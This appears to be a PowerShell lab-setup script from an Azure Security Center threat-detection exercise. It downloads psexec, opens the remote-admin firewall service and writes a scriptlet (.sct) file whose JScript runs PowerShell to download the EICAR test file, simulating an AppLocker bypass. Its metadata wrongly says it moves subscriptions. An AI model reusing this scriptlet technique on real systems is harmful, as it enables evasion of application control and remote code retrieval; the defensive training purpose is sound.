#requires -version 5.1

# For TLS 1.2
Using Namespace System.Net

<#
.SYNOPSIS
Prepare simulated source attack servers for threat detection exercise.

.DESCRIPTION
This purpose of this script, which is part of the Activate Azure with Administration and Governance offering, 
will prepare the SQL servers CZ###-APPNPSQL01 and CZ###-APPNPSQL02 (### represents the 3 character Azure region code) for an AppLocker bypass scenario during on of the POC exercises for Azure Security Center.
Please see POC exercise 12.3.3 Threat Detection with Azure Security Center for details.

PRE-REQUISITES:
1. For tesing, before executing this script, ensure that you change the directory to the directory where the script is located. For example, if the script is in: c:\scripts\script.ps1 then
    change to this directory using the following command: 
    Set-Location -Path c:\scripts

.PARAMETER zipFileUrl
URL of the zip archive containing the PStools set of utilities, including psexec.exe.

.PARAMETER extractPath
Path where zip file contents will be extracted to.

.PARAMETER zipDir
The target directory on the host where the zipped archive will be download to from the online URL source specified with the parameter $zipFileUrl.

.PARAMETER exeFile
The executable tool file name that will be used in this exercise.

.EXAMPLE
NA: This script will run unattended as a custom script extension, but can be tested interactively as:
.\Set-BypassAppLockerScenario.ps1 -Verbose

.INPUTS
None

.OUTPUTS
None


.NOTES
LEGAL DISCLAIMER:
This Sample Code is provided for the purpose of illustration only and is not intended to be used in a production environment. 
THIS SAMPLE CODE AND ANY RELATED INFORMATION ARE PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A PARTICULAR PURPOSE. 
We grant You a nonexclusive, royalty-free right to use and modify the Sample Code and to reproduce and distribute the object code form of the Sample Code, provided that You agree:
(i) to not use Our name, logo, or trademarks to market Your software product in which the Sample Code is embedded;
(ii) to include a valid copyright notice on Your software product in which the Sample Code is embedded; and
(iii) to indemnify, hold harmless, and defend Us and Our suppliers from and against any claims or lawsuits, including attorneys' fees, that arise or result from the use or distribution of the Sample Code.
This posting is provided "AS IS" with no warranties, and confers no rights.

.COMPONENT
Azure, Security Center, Azure Defender

.ROLE
Automation Engineer
DevOps Engineer
Azure Engineer
Azure Administrator
Azure Architect

.FUNCTIONALITY
Moves subscriptions between management groups.

.LINK
1. https://shellgeek.com/download-zip-file-using-powershell/

#>

[CmdletBinding()]
param 
(
    [string]$zipFileUrl = "https://download.sysinternals.com/files/PSTools.zip",
    [string]$extractPath = "C:\tools",
    [string]$zipDir = "zipDir",
    [string]$exeFile = "psexec.exe"
) # end param

Write-Output "Configuring security protocol to use TLS 1.2 for security compliance." -Verbose
[ServicePointManager]::SecurityProtocol = [SecurityProtocolType]::Tls12

# Install Azure AD modules
Install-WindowsFeature -Name RSAT-AD-PowerShell -Verbose 

$fullZipDir = Join-Path -Path $extractPath -ChildPath $zipDir
$fullExePath = Join-Path -Path $extractPath -ChildPath $exeFile 

# Create target directory
New-Item -Path $extractPath -ItemType Directory -Verbose
New-Item -path $fullZipDir -ItemType Directory -Verbose 
# Get filename
$DownloadZipFile = $fullZipDir + "\" + $(Split-Path -path $zipFileUrl -Leaf)

# Retrieve zip file from web
Invoke-WebRequest -Uri $zipFileUrl -OutFile $DownloadZipFile
$ExtractShell = New-Object -ComObject Shell.Application 

# Extract Files
$ExtractFiles = $ExtractShell.Namespace($DownloadZipFile).Items()

# Copy extracted files
$ExtractShell.NameSpace($extractPath).CopyHere($ExtractFiles) 
Start-Process $ExtractPath -Verbose

# Enable remoteadmin firewall
if (Test-Path -path $fullExePath)
{
    netsh firewall set service remoteadmin enable 
} # end if

# Hold suspicious script content.
$testSctFileContent = @"
<?XML version="1.0"?>
<scriptlet>
<registration
progid="TESTING"
classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
<script language="JScript">
<![CDATA[
var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe Invoke-WebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");
]]>
</script>
</registration>
</scriptlet>
"@

$testSctFileName = "test.sct"
$testSctFilePath = Join-Path $extractPath -ChildPath $testSctFileName

# Create suspicious script file
New-Item -Path $testSctFilePath -ItemType File -Verbose

# Add content to suspicious script file
Add-Content -Path $testSctFilePath -Value $testSctFileContent -PassThru

Write-Output "Script complete."

Exit-PSSession